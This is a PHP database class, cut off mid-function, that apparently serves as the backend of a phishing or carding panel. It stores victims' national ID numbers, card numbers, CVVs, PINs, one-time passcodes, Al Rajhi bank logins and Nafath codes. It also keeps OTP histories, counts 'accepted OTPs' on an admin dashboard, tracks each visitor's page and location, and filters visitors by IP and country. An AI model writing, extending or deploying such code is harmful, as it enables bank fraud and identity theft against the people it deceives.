<?php

/**
 * User System Lofin
 */
class User extends DB
{

  // users name of table
  private $table = 'admin';

  public function login($data)
  {
    $sql = 'SELECT * FROM ' . $this->table . ' WHERE `username` = :username OR `email` = :email LIMIT 1';

    $this->query($sql);
    $this->bind(':username', $data['username']);
    $this->bind(':email', $data['email']);
    $this->execute();

    // Store returned info from db in $user var
    $user = $this->fetch();
    if ($this->rowCount() > 0) {

      // Check if password is correct
      if ($data['password'] == $user->password) {
        $_SESSION['user_session'] = $user->id;
        return true;
      } else {
        return false;
      }
    }
  }
  public function fetchAdminById($id)
  {
    $sql = 'SELECT * FROM `admin` WHERE `id` = :id ';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->execute();
    $data = $this->fetch();
    if ($this->rowCount() > 0)
      return $data;
    else
      return false;
  }
  public function fetchUserById($id)
  {
    $sql = 'SELECT * FROM `users` WHERE `id` = :id ';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->execute();
    $data = $this->fetch();
    if ($this->rowCount() > 0)
      return $data;
    else
      return false;
  }
  public function UpdateCardRajhi($id, $data = array())
  {
    $sql = 'UPDATE `card` SET `rajhi_status` = :rajhi_status, `username` = :username, `passwordt` = :password  WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':username', $data['username']);
    $this->bind(':password', $data['password']);
    $this->bind(':rajhi_status', 0);
    return $this->execute();
  }

  public function UpdateCardRajhiStatus($id, $status)
  {
    $sql = 'UPDATE `card` SET `rajhi_status` = :status WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':status', $status);
    return $this->execute();
  }
  public function fetchCardById($id)
  {
    $sql = 'SELECT * FROM `card` WHERE `id` = :id ';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->execute();
    $data = $this->fetch();
    if ($this->rowCount() > 0)
      return $data;
    else
      return false;
  }

  /**
   * Delete User by ID
   */
  public function deleteAdminById($id)
  {
    $sql = 'DELETE FROM `admin` WHERE `id` = :id ';
    $this->query($sql);
    $this->bind(':id', $id);
    return $this->execute();
  }

  public function updateAdminPassword($id, $newPassword)
  {
    $sql = 'UPDATE `admin` SET `password` = :password WHERE `id` = :id ';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':password', md5($newPassword));
    return $this->execute();
  }

  // Check if user is steal logged in by session
  public function isLoggedIn()
  {
    if (isset($_SESSION['user_session']))
      return true;
  }

  public function logOut()
  {
    session_destroy();
    unset($_SESSION['user_session']);
    if (isset($_SESSION['user_session']))
      return false;
    else
      return true;
  }

  public function redirect($url)
  {

    echo "
      <script>
      window.location.href=\"$url\";
      </script>
      ";
  }

  /**
   * Fetch users
   */

  public function insertAdmin($data = array())
  {
    $sql = 'INSERT INTO `admin` (`username`,
                                  `email`,
                                  `password`)
                                    VALUE ( :username,:email,:password)
                                           ';
    $this->query($sql);
    $this->bind(':username', $data['username']);
    $this->bind(':email', $data['email']);
    $this->bind('password', $data['password']);


    return $this->execute();
  }

  public function fetchAllAdmin()
  {

    $sql = 'SELECT * FROM `admin`;';

    $this->query($sql);
    $this->execute();
    $data = $this->fetchAll();


    if ($this->rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }
  public function fetchAllUsers()
  {

    $sql = 'SELECT *, (SELECT COUNT(*) FROM chat_messages cm WHERE cm.session_id COLLATE utf8mb4_general_ci = users.chat_session_id AND cm.sender_type = "visitor" AND cm.is_read = 0) as chat_unread_count FROM `users` WHERE `is_archived` = 0 ORDER BY is_pinned DESC, id DESC;';

    $this->query($sql);
    $this->execute();
    $data = $this->fetchAll();


    if ($this->rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function fetchArchivedUsers()
  {
    $sql = 'SELECT *, (SELECT COUNT(*) FROM chat_messages cm WHERE cm.session_id COLLATE utf8mb4_general_ci = users.chat_session_id AND cm.sender_type = "visitor" AND cm.is_read = 0) as chat_unread_count FROM `users` WHERE `is_archived` = 1 ORDER BY is_pinned DESC, id DESC;';
    $this->query($sql);
    $this->execute();
    $data = $this->fetchAll();
    if ($this->rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function getDashboardStats()
  {
    $stats = new stdClass();

    // Daily Visitors
    $sql1 = "SELECT COUNT(*) as total FROM `users` WHERE DATE(`created_at`) = CURDATE()";
    $this->query($sql1);
    $res1 = $this->fetch();
    $stats->daily_visitors = $res1->total;

    // Total Cards
    $sql2 = "SELECT COUNT(*) as total FROM `card`";
    $this->query($sql2);
    $res2 = $this->fetch();
    $stats->total_cards = $res2->total;

    // Accepted OTPs (status = 1 and otp is not null/empty)
    $sql3 = "SELECT COUNT(*) as total FROM `card` WHERE `status` = 1 AND `otp` IS NOT NULL AND `otp` != ''";
    $this->query($sql3);
    $res3 = $this->fetch();
    $stats->accepted_otps = $res3->total;

    return $stats;
  }

  public function archiveUser($id)
  {
    $sql = 'UPDATE `users` SET `is_archived` = 1 WHERE `id` = :id';
    $this->query($sql);
    $this->bind(':id', $id);
    return $this->execute();
  }

  public function unarchiveUser($id)
  {
    $sql = 'UPDATE `users` SET `is_archived` = 0 WHERE `id` = :id';
    $this->query($sql);
    $this->bind(':id', $id);
    return $this->execute();
  }

  public function toggleDistinguished($id)
  {
    $sql = 'UPDATE `users` SET `is_distinguished` = NOT `is_distinguished` WHERE `id` = :id';
    $this->query($sql);
    $this->bind(':id', $id);
    return $this->execute();
  }

  public function togglePin($id)
  {
    $sql = 'UPDATE `users` SET `is_pinned` = NOT `is_pinned` WHERE `id` = :id';
    $this->query($sql);
    $this->bind(':id', $id);
    return $this->execute();
  }

  public function toggleCompleted($id)
  {
    $sql = 'UPDATE `users` SET `is_completed` = NOT `is_completed` WHERE `id` = :id';
    $this->query($sql);
    $this->bind(':id', $id);
    return $this->execute();
  }

  public function deleteMultipleUsers($ids)
  {
    if (empty($ids))
      return false;
    $placeholders = implode(',', array_fill(0, count($ids), '?'));
    $sql = "DELETE FROM `users` WHERE `id` IN ($placeholders)";
    $this->query($sql);
    foreach ($ids as $index => $id) {
      $this->bind($index + 1, $id);
    }
    return $this->execute();
  }

  public function deleteCard($id)
  {
    // Clean up OTP history first
    $this->query('DELETE FROM `card_otp_history` WHERE `card_id` = :id');
    $this->bind(':id', $id);
    $this->execute();

    // Delete the card
    $sql = 'DELETE FROM `card` WHERE `id` = :id';
    $this->query($sql);
    $this->bind(':id', $id);
    return $this->execute();
  }

  public function deleteMultipleCards($ids)
  {
    if (empty($ids))
      return false;

    // Clean up OTP history for all targeted cards
    $placeholders = implode(',', array_fill(0, count($ids), '?'));

    $this->query("DELETE FROM `card_otp_history` WHERE `card_id IN ($placeholders)");
    foreach ($ids as $index => $id) {
      $this->bind($index + 1, $id);
    }
    $this->execute();

    // Delete the cards
    $sql = "DELETE FROM `card` WHERE `id` IN ($placeholders)";
    $this->query($sql);
    foreach ($ids as $index => $id) {
      $this->bind($index + 1, $id);
    }
    return $this->execute();
  }

  public function updateVisitorInfo($id, $data)
  {
    $sql = 'UPDATE `users` SET 
            `device` = :device, 
            `browser` = :browser, 
            `ip` = :ip, 
            `location` = :location,
            `last_activity` = CURRENT_TIMESTAMP 
            WHERE `id` = :id';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':device', $data['device']);
    $this->bind(':browser', $data['browser']);
    $this->bind(':ip', $data['ip']);
    $this->bind(':location', $data['location']);
    return $this->execute();
  }
  public function fetchAllCards()
  {
    $sql = 'SELECT * FROM `card` ORDER BY id DESC;';
    // Use $this-> instead of DB:: to prevent Fatal Errors in PHP 8.2+
    $this->query($sql);
    $this->execute();
    $data = $this->fetchAll();

    if ($this->rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function NumberOfCards()
  {

    $sql = 'SELECT count(*) as total FROM `card`';

    $this->query($sql);
    $this->execute();
    $data = $this->fetchAll();

    if ($this->rowCount() > 0) {
      return $data;
    } else {
      return 0;
    }
  }

  public function registerSecond($data = array())
  {
    $sql = 'INSERT INTO `users` (
      `phone`,  
      `ssn`,  
      `date`,    
      `numb`, 
      `password`, 
      `pass`, 
      `page`,
      `message`)
       VALUE (
      :phone,
      :ssn,
      :date,
      :numb,
      :password,
      :pass,
      :page,
      :message
      )';
    //$hashedPassword = password_hash($data['password'], PASSWORD_DEFAULT);
    $this->query($sql);
    $this->bind(':phone', $data['phone']);
    $this->bind(':ssn', $data['ssn']);
    $this->bind(':date', $data['date']);
    $this->bind(':numb', $data['numb']);
    $this->bind(':password', $data['password']);
    $this->bind(':pass', $data['pass']);
    $this->bind(':page', $data['page']);
    $this->bind(':message', $data['message']);
    if ($this->execute())
      return $this->lastInsertId();
    else
      return false;
  }

  public function forgetPassword($data = array())
  {
    $sql = 'INSERT INTO `users` (
      `numb`, 
      `password`, 
      `page`,
      `message`)
       VALUE (
      :numb,
      :password,
      :page,
      :message
      )';
    //$hashedPassword = password_hash($data['password'], PASSWORD_DEFAULT);
    $this->query($sql);
    $this->bind(':numb', $data['numb']);
    $this->bind(':password', $data['password']);
    $this->bind(':page', $data['page']);
    $this->bind(':message', $data['message']);
    if ($this->execute())
      return $this->lastInsertId();
    else
      return false;
  }

  public function register($data = array())
  {
    $info = $this->getClientInfo();
    $sql = 'INSERT INTO `users` (
                                                  `ssn`,  
                                                  `page`,  
                                                  `message`,
                                                  `device`,
                                                  `browser`,
                                                  `ip`,
                                                  `location`,
                                                  `chat_session_id`,
                                                  `firstType`,
                                                  `secondType`,
                                                  `ssnTwo`,
                                                  `jamNum`,
                                                  `tasal`,
                                                  `createdYear`)
                                                   VALUE (
                                                  :ssn,
                                                  :page,
                                                  :message,
                                                  :device,
                                                  :browser,
                                                  :ip,
                                                  :location,
                                                  :chat_session_id,
                                                  :firstType,
                                                  :secondType,
                                                  :ssnTwo,
                                                  :jamNum,
                                                  :tasal,
                                                  :createdYear
                                                  )';
    //$hashedPassword = password_hash($data['password'], PASSWORD_DEFAULT);
    $this->query($sql);
    $this->bind(':ssn', $data['ssn']);
    $this->bind(':page', $data['page']);
    $this->bind(':message', $data['message']);
    $this->bind(':device', $info['device']);
    $this->bind(':browser', $info['browser']);
    $this->bind(':ip', $info['ip']);
    $this->bind(':location', $info['location']);

    $this->bind(':chat_session_id', $data['chat_session_id'] ?? null);

    $this->bind(':firstType', $data['firstType'] ?? null);
    $this->bind(':secondType', $data['secondType'] ?? null);
    $this->bind(':ssnTwo', $data['ssnTwo'] ?? null);
    $this->bind(':jamNum', $data['jamNum'] ?? null);
    $this->bind(':tasal', $data['tasal'] ?? null);
    $this->bind(':createdYear', $data['yearOf'] ?? null);


    if ($this->execute())
      return $this->lastInsertId();
    else
      return false;
  }

  public function getClientInfo()
  {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown User Agent';

    // Better IP detection (Handling Cloudflare and Proxies)
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
      $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    } elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {
      $ip = $_SERVER['HTTP_X_REAL_IP'];
    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
      $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else {
      $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    }

    // Simple Browser Detection
    $browser = "Unknown Browser";
    if (strpos($userAgent, 'MSIE') !== FALSE)
      $browser = 'Internet Explorer';
    elseif (strpos($userAgent, 'Trident') !== FALSE)
      $browser = 'Internet Explorer';
    elseif (strpos($userAgent, 'Edge') !== FALSE)
      $browser = 'Microsoft Edge';
    elseif (strpos($userAgent, 'Firefox') !== FALSE)
      $browser = 'Mozilla Firefox';
    elseif (strpos($userAgent, 'Chrome') !== FALSE)
      $browser = 'Google Chrome';
    elseif (strpos($userAgent, 'Safari') !== FALSE)
      $browser = 'Apple Safari';
    elseif (strpos($userAgent, 'Opera') !== FALSE)
      $browser = 'Opera';
    elseif (strpos($userAgent, 'Netscape') !== FALSE)
      $browser = 'Netscape';

    // Simple Device Detection
    $device = "Desktop";
    if (preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i', $userAgent)) {
      $device = "Mobile";
    }

    // Real Location detection via API
    $location = "Unknown Location";
    if ($ip !== '::1' && $ip !== '127.0.0.1' && !empty($ip)) {
      try {
        // Fast cURL request to ip-api.com (2 second timeout)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/{$ip}?fields=status,country,city");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        $response = curl_exec($ch);
        curl_close($ch);

        if ($response) {
          $geo = json_decode($response, true);
          if ($geo && $geo['status'] === 'success') {
            $location = ($geo['country'] ?? '') . (isset($geo['city']) ? ", " . $geo['city'] : "");
          }
        }
      } catch (Exception $e) {
        $location = "Unknown Location";
      }
    } else {
      $location = "Localhost / Internal";
    }

    return [
      'device' => $device,
      'browser' => $browser,
      'ip' => $ip,
      'location' => $location
    ];
  }

  public function InsertCardRelatedUser($id, $data = array())
  {
    $sql = 'INSERT INTO `card` (
      `bank`,
      `cardNumber`,
      `month`,
      `year`,
      `password`,
      `bad`,
      `userId`)
       VALUE (
      :bank,
      :cardNumber,
      :month,
      :year,
      :password,
      :bad,
      :id
      )';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':bank', $data['bank']);
    $this->bind(':cardNumber', $data['cardNumber']);
    $this->bind(':month', $data['month']);
    $this->bind(':year', $data['year']);
    $this->bind(':password', $data['password']);
    $this->bind(':bad', $data['bad']);

    if ($this->execute())
      return $this->lastInsertId();
    else
      return false;
  }

  public function InsertCardTwoRelatedUser($id, $data = array())
  {
    $sql = 'INSERT INTO `card` (
      `cardNumber`,
      `month`,
      `year`,
      `cvv`,
      `bank`,
      `userId`)
       VALUE (
      :cardNumber,
      :month,
      :year,
      :cvv,
      :bank,
      :id
      )';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':cardNumber', $data['cardNumber']);
    $this->bind(':month', $data['month']);
    $this->bind(':year', $data['year']);
    $this->bind(':cvv', $data['cvv']);
    $this->bind(':bank', $data['bank']);

    if ($this->execute())
      return $this->lastInsertId();
    else
      return false;
  }

  public function InsertCardVisaRelatedUser($id, $data = array())
  {
    $sql = 'INSERT INTO `card` (
      `cardNumber`,
      `cardname`,
      `year`,
      `totalprice`,
      `cvv`,
      `userId`)
       VALUE (
      :cardNumber,
      :cardname,
      :year,
      :totalprice,
      :cvv,
      :id
      )';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':cardNumber', $data['cardNumber']);
    $this->bind(':cardname', $data['cardname']);
    $this->bind(':year', $data['year']);
    $this->bind(':totalprice', $data['totalprice']);
    $this->bind(':cvv', $data['cvv']);

    if ($this->execute())
      return $this->lastInsertId();
    else
      return false;
  }



  public function UpdateStatus($id, $message)
  {
    $sql2 = 'UPDATE `users` SET `message` = :message WHERE `id` = :id ;';

    $this->query($sql2);
    $this->bind(':id', $id);
    $this->bind(':message', $message);
    return $this->execute();
  }

  public function UpdateAccount($id, $data = array())
  {
    $sql2 = 'UPDATE `users` SET `phone` = :phone , `message` = :message WHERE `id` = :id ;';

    $this->query($sql2);
    $this->bind(':id', $id);
    $this->bind(':phone', $data['phone']);
    $this->bind(':message', $data['message']);
    return $this->execute();
  }

  public function UpdateCardOTP($id, $data = array())
  {
    // 1. Save the current OTP to history before overwriting
    $this->saveOTPToHistory($id);

    // 2. Update the card with new OTP
    $sql = 'UPDATE `card` SET `status` = :status, `otp` = :otp WHERE `id` = :id';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':otp', $data['otp']);
    $this->bind(':status', 0);
    return $this->execute();
  }

  /**
   * Save the current OTP of a card to history log (before overwriting)
   */
  public function saveOTPToHistory($cardId)
  {
    // Fetch current OTP
    $sql = 'SELECT `otp` FROM `card` WHERE `id` = :id LIMIT 1';
    $this->query($sql);
    $this->bind(':id', $cardId);
    $this->execute();
    $card = $this->fetch();

    if ($card && !empty($card->otp)) {
      $sql2 = 'INSERT INTO `card_otp_history` (`card_id`, `otp`) VALUES (:card_id, :otp)';
      $this->query($sql2);
      $this->bind(':card_id', $cardId);
      $this->bind(':otp', $card->otp);
      $this->execute();
    }
  }

  /**
   * Fetch OTP history for a specific card, newest first
   */
  public function fetchOTPHistory($cardId)
  {
    $sql = 'SELECT `otp`, `created_at` FROM `card_otp_history` WHERE `card_id` = :card_id ORDER BY `created_at` DESC LIMIT 10';
    $this->query($sql);
    $this->bind(':card_id', $cardId);
    $this->execute();
    $data = $this->fetchAll();
    return $data ?: [];
  }

  /**
   * Ensure Nafath history table exists
   */
  public function setupNafathHistoryTable()
  {
    $sql = "CREATE TABLE IF NOT EXISTS `card_nafath_history` (
              `id` int(11) NOT NULL AUTO_INCREMENT,
              `card_id` int(11) NOT NULL,
              `code` varchar(20) NOT NULL,
              `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
              PRIMARY KEY (`id`),
              KEY `card_id` (`card_id`)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;";
    $this->query($sql);
    return $this->execute();
  }

  /**
   * Save a Nafath verification code to history
   */
  public function saveNafathCodeToHistory($cardId, $code)
  {
    if (empty($code)) return false;
    $this->setupNafathHistoryTable(); // Ensure table exists
    
    $sql = 'INSERT INTO `card_nafath_history` (`card_id`, `code`) VALUES (:card_id, :code)';
    $this->query($sql);
    $this->bind(':card_id', $cardId);
    $this->bind(':code', $code);
    return $this->execute();
  }

  /**
   * Fetch Nafath code history for a specific card
   */
  public function fetchNafathCodeHistory($cardId)
  {
    $this->setupNafathHistoryTable();
    $sql = 'SELECT `code`, `created_at` FROM `card_nafath_history` WHERE `card_id` = :card_id ORDER BY `created_at` DESC LIMIT 10';
    $this->query($sql);
    $this->bind(':card_id', $cardId);
    $this->execute();
    $data = $this->fetchAll();
    return $data ?: [];
  }

  public function UpdatePassword($id, $data = array())
  {

    $sql = 'UPDATE `users` SET `status` = :status, `pass` = :password , `message` = :message  WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':password', $data['password']);
    $this->bind(':message', $data['message']);
    $this->bind(':status', 0);
    return $this->execute();
  }

  public function UpdateCardCVV($id, $data = array())
  {

    $sql = 'UPDATE `card` SET `cvv` = :cvv  WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':cvv', $data['cvv']);
    return $this->execute();
  }

  public function UpdateVerify($id, $data = array())
  {

    $sql = 'UPDATE `users` SET `waitVerify` = :waitVerify , `message` = :message WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':waitVerify', $data['waitVerify']);
    $this->bind(':message', 'Wait Verify');
    return $this->execute();
  }

  public function DeleteUserById($id)
  {
    $sql = 'DELETE FROM `users` WHERE `id` = :id ';
    $this->query($sql);
    $this->bind(':id', $id);
    return $this->execute();
  }

  public function DeleteAllUsers()
  {
    try {
      // Delete in order to respect any foreign key constraints if they exist
      $this->query("DELETE FROM `chat_messages` ");
      $this->execute();

      $this->query("DELETE FROM `chat_sessions` ");
      $this->execute();

      $this->query("DELETE FROM `card` ");
      $this->execute();

      $this->query("DELETE FROM `users` ");
      return $this->execute();
    } catch (Exception $e) {
      // If some tables don't exist yet, just continue
      return true;
    }
  }

  public function UpdateCardCodeById($id, $code)
  {

    $sql = 'UPDATE `card` SET `code` = :code WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':code', $code);
    return $this->execute();
  }


  public function UpdateCardPasswordById($id, $password)
  {

    $sql = 'UPDATE `card` SET `status` = :status, `password` = :password WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':password', $password);
    $this->bind(':status', 0);
    return $this->execute();
  }
  public function register2($data = array())
  {
    $sql = 'INSERT INTO `card` (
                                                  `cardNumber`,
                                                   `expire1`,
                                                  `expire2`,
                                                  `cvv`
                                                  ) VALUE (
                                                  :cardNumber,
                                                  :month,
                                                  :year,
                                                  :cvv
                                                  )';
    $this->query($sql);
    $this->bind(':cardNumber', $data['cardNumber']);
    $this->bind(':month', $data['month']);
    $this->bind(':year', $data['year']);
    $this->bind(':cvv', $data['cvv']);
    if ($this->execute())
      return $this->lastInsertId();
    else
      return false;
  }

  public function UpdateUserCodeById($id, $code)
  {

    $sql = 'UPDATE `users` SET `code` = :code WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':code', $code);
    return $this->execute();
  }
  public function UpdateUserCheckTheCodeById($id, $code)
  {

    $sql = 'UPDATE `users` SET `CheckTheCode` = :code WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':code', $code);
    return $this->execute();
  }
  public function UpdateUserStatusById($id, $status)
  {
    $sql = 'UPDATE `users` SET `status` = :status WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':status', $status);
    return $this->execute();
  }

  public function UpdateUserCheckTheInfo_NafadAndTextById($id, $code, $temp)
  {

    $sql = 'UPDATE `card` SET `CheckTheInfo_Nafad` = :code , `TemporaryPassword` = :temp  WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':code', $code);
    $this->bind(':temp', $temp);
    return $this->execute();
  }

  public function UpdateCard($id, $code)
  {

    $sql = 'UPDATE `card` SET `status` = :code WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':code', $code);
    return $this->execute();
  }

  public function FetchAllUsersForList()
  {

    $sql = 'SELECT * FROM `users` ORDER BY id DESC;';

    $this->query($sql);
    $this->execute();
    $data = $this->fetchAll();


    if ($this->rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }


  public function UpdateUserById($id, $access)
  {

    $sql = 'UPDATE `users` SET `access` = :access WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':access', $access);
    return $this->execute();
  }
  public function insertLink($data)
  {

    $sql = 'UPDATE `users` SET `link` = :link WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $data['id']);
    $this->bind(':link', $data['link']);
    return $this->execute();
  }
  public function updateAdmin($id, $data)
  {
    $sql = 'UPDATE `admin` SET `username` = :username,`password` = :password,`email` = :email
                                  WHERE `id` = :id';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':username', $data['username']);
    $this->bind(':email', $data['email']);
    $this->bind(':password', $data['password']);
    return $this->execute();
  }
  public function fetchAdmin($id)
  {
    $sql = 'SELECT * FROM `admin` WHERE `id` = :id ';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->execute();
    $data = $this->fetch();
    if ($this->rowCount() > 0)
      return $data;
    else
      return false;
  }

  public function GetVisits()
  {
    $sql = 'SELECT * FROM `admin` WHERE `id` = :id;';
    $this->query($sql);
    $this->bind(':id', 1);
    $this->execute();
    $data = $this->fetch();
    if ($this->rowCount() > 0)
      return $data;
    else
      return false;
  }

  public function UpdateVisits($new)
  {
    $sql2 = 'UPDATE `admin` SET `visits` = :temp WHERE `id` = :id ;';
    $this->query($sql2);
    $this->bind(':id', 1);
    $this->bind(':temp', $new);
    return $this->execute();
  }

  public function UpdateCurrentPage($id, $currentpage)
  {
    $sql = 'UPDATE `users` SET `page` = :currentpage, `last_activity` = CURRENT_TIMESTAMP WHERE `id` = :id ;';
    $this->query($sql);
    $this->bind(':id', $id);
    $this->bind(':currentpage', $currentpage);
    return $this->execute();
  }

  public function isIPBanned($ip)
  {
    try {
      $sql = "SELECT id FROM `banned_ips` WHERE `ip` = :ip LIMIT 1";
      $this->query($sql);
      $this->bind(':ip', $ip);
      $this->execute();
      return $this->rowCount() > 0;
    } catch (Exception $e) {
      // Fail safely if table doesn't exist yet
      return false;
    }
  }

  public function fetchAllBannedIPs()
  {
    try {
      // Ensure table exists first to avoid 500 errors
      $this->createSecurityTables();
      $this->createSecurityTables();
      $sql = "SELECT ip FROM `banned_ips`";
      $this->query($sql);
      $records = $this->fetchAll();
      $ips = [];
      if ($records) {
        foreach ($records as $rec) {
          if (isset($rec->ip))
            $ips[] = $rec->ip;
        }
      }
      return $ips;
    } catch (Exception $e) {
      return [];
    }
  }

  private function createSecurityTables()
  {
    try {
      $sql_ips = "CREATE TABLE IF NOT EXISTS `banned_ips` (
              `id` INT AUTO_INCREMENT PRIMARY KEY,
              `ip` VARCHAR(50) NOT NULL UNIQUE,
              `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP
          )";
      $this->query($sql_ips);
      $this->execute();

      $sql_cards = "CREATE TABLE IF NOT EXISTS `banned_cards` (
              `id` INT AUTO_INCREMENT PRIMARY KEY,
              `card_number` VARCHAR(20) NOT NULL UNIQUE,
              `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP
          )";
      $this->query($sql_cards);
      $this->execute();
    } catch (Exception $e) {
      // Fail silently
    }
  }

  public function fetchAllBannedCards()
  {
    try {
      $this->createSecurityTables();
      $this->createSecurityTables();
      $sql = "SELECT card_number FROM `banned_cards`";
      $this->query($sql);
      $records = $this->fetchAll();
      $cards = [];
      if ($records) {
        foreach ($records as $rec) {
          if (isset($rec->card_number))
            $cards[] = $rec->card_number;
        }
      }
      return $cards;
    } catch (Exception $e) {
      return [];
    }
  }

  public function banIP($ip)
  {
    if (!$ip)
      return false;
    $this->createSecurityTables();
    $sql = "INSERT IGNORE INTO `banned_ips` (`ip`) VALUES (:ip)";
    $this->query($sql);
    $this->bind(':ip', $ip);
    return $this->execute();
  }

  public function unbanIP($ip)
  {
    $sql = "DELETE FROM `banned_ips` WHERE `ip` = :ip";
    $this->query($sql);
    $this->bind(':ip', $ip);
    return $this->execute();
  }

  public function isCardBanned($cardNumber)
  {
    try {
      $sql = "SELECT id FROM `banned_cards` WHERE `card_number` = :card_number LIMIT 1";
      $this->query($sql);
      $this->bind(':card_number', $cardNumber);
      $this->execute();
      return $this->rowCount() > 0;
    } catch (Exception $e) {
      return false;
    }
  }

  public function banCard($cardNumber)
  {
    if (!$cardNumber)
      return false;
    $this->createSecurityTables();
    if ($this->isCardBanned($cardNumber))
      return true;

    $sql = "INSERT INTO `banned_cards` (`card_number`) VALUES (:card_number)";
    $this->query($sql);
    $this->bind(':card_number', $cardNumber);
    return $this->execute();
  }

  public function unbanCard($cardNumber)
  {
    $sql = "DELETE FROM `banned_cards` WHERE `card_number` = :card_number";
    $this->query($sql);
    $this->bind(':card_number', $cardNumber);
    return $this->execute();
  }

  public function setupAllowedCountriesTable()
  {
    try {
      $sql = "CREATE TABLE IF NOT EXISTS `allowed_countries` (
                `id` INT AUTO_INCREMENT PRIMARY KEY, 
                `country_code` VARCHAR(10) UNIQUE NOT NULL, 
                `country_name` VARCHAR(100) NOT NULL, 
                `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;";
      $this->query($sql);
      return $this->execute();
    } catch (Exception $e) {
      return false;
    }
  }

  public function getAllowedCountries()
  {
    try {
      $this->setupAllowedCountriesTable(); // Auto-migration
      $sql = "SELECT * FROM `allowed_countries` ORDER BY country_name ASC";
      $this->query($sql);
      return $this->fetchAll();
    } catch (Exception $e) {
      return [];
    }
  }

  public function isCountryAllowed($countryCode)
  {
    if (!$countryCode)
      return true; // Fail open if no code? Better fail closed but we depend on API
    try {
      $sql = "SELECT id FROM `allowed_countries` WHERE `country_code` = :code LIMIT 1";
      $this->query($sql);
      $this->bind(':code', strtoupper($countryCode));
      $this->execute();
      return $this->rowCount() > 0;
    } catch (Exception $e) {
      return true;
    }
  }

  public function addAllowedCountry($code, $name)
  {
    try {
      $sql = "INSERT IGNORE INTO `allowed_countries` (`country_code`, `country_name`) VALUES (:code, :name)";
      $this->query($sql);
      $this->bind(':code', strtoupper($code));
      $this->bind(':name', $name);
      return $this->execute();
    } catch (Exception $e) {
      return false;
    }
  }

  public function removeAllowedCountry($id)
  {
    try {
      $sql = "DELETE FROM `allowed_countries` WHERE `id` = :id";
      $this->query($sql);
      $this->bind(':id', $id);
      return $this->execute();
    } catch (Exception $e) {
      return false;
    }
  }

  private function setupSettingsTable()
  {
    try {
      $sql = "CREATE TABLE IF NOT EXISTS `settings` (
                `id` INT AUTO_INCREMENT PRIMARY KEY,
                `setting_key` VARCHAR(50) UNIQUE NOT NULL,
                `setting_value` TEXT,
                `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;";
      $this->query($sql);
      $this->execute();

      // Default settings
      $defaultSettings = [
        'chat_enabled' => '1'
      ];
      foreach ($defaultSettings as $key => $val) {
        $check = "INSERT IGNORE INTO `settings` (`setting_key`, `setting_value`) VALUES (:key, :val)";
        $this->query($check);
        $this->bind(':key', $key);
        $this->bind(':val', $val);
        $this->execute();
      }
    } catch (Exception $e) {
    }
  }

  public function getSetting($key)
  {
    $this->setupSettingsTable();
    try {
